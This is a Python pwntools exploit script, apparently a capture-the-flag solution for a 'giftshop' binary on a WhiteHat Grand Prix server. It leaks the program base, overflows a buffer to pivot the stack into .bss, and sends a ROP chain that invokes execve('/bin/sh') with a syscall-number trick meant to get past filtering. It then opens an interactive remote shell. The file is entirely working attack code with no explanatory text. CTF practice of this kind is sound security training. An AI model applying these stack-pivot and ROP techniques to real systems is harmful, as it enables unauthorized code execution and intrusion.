#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import roputils as rp
from ctypes import c_uint64
import os
import sys

elfPath = "./giftshop"
libcPath = ""
remoteAddr = "pwn01.grandprix.whitehatvn.com"
remotePort = 26129

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
        context.log_level = "info"
    if libcPath:
        libc = ELF(libcPath)

context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = []):
    cmd = "set follow-fork-mode parent\n"
    base = elf.address
    if True:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])

    if bps != []:
        cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def bof(letter):
    assert len(letter) < 240
    io.sendlineafter(":\n", "1")
    io.sendlineafter("y/n\n", "n")
    io.sendlineafter("txt\n", "1")
    io.sendline("6")
    io.sendlineafter("y/n\n", "y")
    io.sendlineafter(": \n", "address")
    io.sendlineafter(":\n", letter)

if __name__ == "__main__":
    io.recvuntil(" !\n")
    elf.address = int(io.recvuntil("\n", drop = True), 16) - 0x2030D8
    success("elf", elf.address)
    io.sendlineafter("??\n", "0000")
    io.sendlineafter(": \n", "1111")

    #  DEBUG([0x19BC])
    fgets_gadgets = 0x18B9 + elf.address
    bof(flat(['\0' * 0xd0, elf.bss() + 0x500, fgets_gadgets]))

    leaveret = 0x0000000000001176 + elf.address
    prdi = 0x000000000000225f + elf.address
    prsi = 0x0000000000002261 + elf.address
    prdx = 0x0000000000002265 + elf.address
    prax = 0x0000000000002267 + elf.address
    syscall = 0x0000000000002254 + elf.address
    binsh = elf.bss() + 0x500 - 0xd0
    rop = flat(["/bin/sh\0", prax, 0x40000000 + 59, prdi, binsh, prsi, 0, prdx, 0, syscall])
    payload = rop.ljust(0xd0, '\0')
    payload += p64(elf.bss() + 0x500 - 0xd0)
    payload += p64(leaveret)
    assert len(payload) < 240
    io.sendline(payload)
    
    io.interactive()
